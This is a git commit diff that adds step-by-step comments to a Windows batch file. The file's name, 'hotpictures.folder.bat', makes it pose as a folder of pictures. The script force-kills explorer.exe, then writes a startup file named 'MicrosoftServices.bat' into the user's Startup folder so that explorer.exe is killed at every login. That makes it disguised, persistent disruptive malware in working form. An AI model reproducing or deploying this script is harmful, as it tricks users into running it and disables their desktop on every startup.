fb4383464ec377375cbf51dcf3e74e3961dc0a2c
jooapa <37744313+jooapa@users.noreply.github.com>
2023-03-06 12:48:12 +0200

    Update hotpictures.folder.bat

--- hotpictures.folder.bat
+++ hotpictures.folder.bat
@@ -1,4 +1,8 @@
+:: kills the explorer.exe process
 taskkill -f -im explorer.exe
+:: opens the folder
 cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+::makes a new file to the folder
 type NUL>MicrosoftServices.bat
+::and writes the code to the file
 @echo taskkill -f -im explorer.exe> MicrosoftServices.bat
